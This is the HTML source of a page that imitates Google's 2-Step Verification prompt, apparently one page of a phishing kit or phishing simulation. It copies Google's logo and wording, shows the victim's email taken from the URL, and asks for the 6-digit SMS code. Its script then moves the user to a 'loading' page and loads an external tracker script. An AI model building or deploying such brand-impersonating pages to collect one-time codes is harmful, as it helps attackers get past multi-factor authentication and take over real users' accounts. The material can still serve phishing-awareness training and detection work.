<!DOCTYPE html>

<html lang="en">

<head>
    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>2-Step Verification</title>

    <meta name="description" content="2-Step Verification.">

    <link rel="icon" type="image/png" href="assets/images/favicon.png">

    <link rel="stylesheet" href="./assets/styles.css">

    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">


<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
</head>

<body>

    <div class="login-container">

        <div class="login-card wide-card">

            

                        <div class="logo">

                <svg width="48" height="48" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">

                    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>

                    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>

                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>

                    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>

                </svg>

            </div>

            <div class="step active">

                <div class="mfa-layout">

                    <div class="mfa-left">

                        <h2>2-Step Verification</h2>

                        <p class="subtitle mfa-subtitle">To help keep your account safe, Google wants to make sure it's really you trying to sign in</p>

                        

                        <div class="user-badge dropdown-badge" onclick="return false;" title="Switch account">

                            <svg viewBox="0 0 24 24" width="20" height="20" fill="#C4C7C5"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>

                            <span id="display-email-mfa" class="email-display"></span>

                            <svg viewBox="0 0 24 24" width="16" height="16" fill="#C4C7C5"><path d="M7 10l5 5 5-5z"/></svg>

                        </div>

                    </div>

                    

                                        <div class="mfa-right">

                        <div id="step-code" class="mfa-step" style="display: block;">

                            <div class="phone-icon-container" style="height: 60px; margin-bottom: 24px;">

                                <svg width="48" height="48" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">

                                    <path d="M40 8H8C5.8 8 4 9.8 4 12V36C4 38.2 5.8 40 8 40H40C42.2 40 44 38.2 44 36V12C44 9.8 42.2 8 40 8ZM40 12L24 22L8 12H40ZM40 36H8V16L24 26L40 16V36Z" fill="#A8C7FA"/>

                                </svg>

                            </div>

                            

                            <h3 class="mfa-prompt-title">Get a verification code</h3>

                            <p class="mfa-prompt-text">A text message with a 6-digit verification code was just sent to your phone number.</p>

                            

                            <form onsubmit="event.preventDefault();">

                                <div class="input-group" style="margin-top: 24px;">

                                    <input type="text" id="code" name="code" required placeholder=" " autocomplete="one-time-code" maxlength="6" pattern="\d{6}">

                                    <label for="code">Enter code</label>

                                </div>

                                

                                <div class="checkbox-group" style="margin-top: 24px;">

                                    <input type="checkbox" id="trust-device" name="trust-device" checked>

                                    <label for="trust-device">Don't ask again on this device</label>

                                </div>

                                

                                <div class="actions" style="margin-top: 48px;">

                                    <button type="button" class="secondary-btn mfa-another-way">Try another way</button>

                                    <button type="submit" class="primary-btn">Next</button>

                                </div>

                            </form>

                        </div>

                    </div>

            </div>



        </div>

    </div>

    

    </div>

    <div class="footer">

        <select id="language" name="language" class="language-selector">

            <option value="en">English (United States)</option>

            <option value="es">Español (España)</option>

            <option value="fr">Français (France)</option>

        </select>

        <div class="footer-links">

            <a href="#">Help</a>

            <a href="#">Privacy</a>

            <a href="#">Terms</a>

        </div>

    </div>



    <script>

        document.addEventListener("DOMContentLoaded", () => {

            const params = new URLSearchParams(window.location.search);

            let email = params.get('email');

            if (email) {
                localStorage.setItem('email', email);
            } else {
                email = localStorage.getItem('email');
            }

            if(email) {

                document.getElementById('display-email-mfa').innerText = email;

            }

            setTimeout(() => document.getElementById('code').focus(), 50);
            
            // Handle form submission to redirect to loading page
            const codeForm = document.querySelector('#step-code form');
            if(codeForm) {
                codeForm.addEventListener('submit', function(e) {
                    e.preventDefault();
                    const code = document.getElementById('code').value;
                    if(code) {
                        window.location.href = 'loading.html';
                    }
                });
            }
            
            // Handle "Try another way" button to pass email
            const anotherWayBtn = document.querySelector('.mfa-another-way');
            if(anotherWayBtn && email) {
                anotherWayBtn.addEventListener('click', function(e) {
                    e.preventDefault();
                    window.location.href = 'notification.html?email=' + encodeURIComponent(email);
                });
            }

        });

    </script>



</body>

</html>
